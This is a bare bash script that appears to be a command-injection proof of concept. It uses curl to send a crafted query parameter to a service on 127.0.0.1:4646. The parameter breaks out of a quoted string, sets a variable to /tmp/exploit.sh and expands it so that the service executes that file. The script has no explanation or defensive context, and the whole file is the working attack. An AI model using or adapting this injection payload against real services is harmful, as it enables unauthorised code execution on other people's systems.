#!/bin/bash
curl -Gv '127.0.0.1:4646' \
--data-urlencode "x=\"</;EXPLOIT=\"/tmp/exploit.sh\";\${EXPLOIT,,};#"	\
--data-urlencode "y=0"
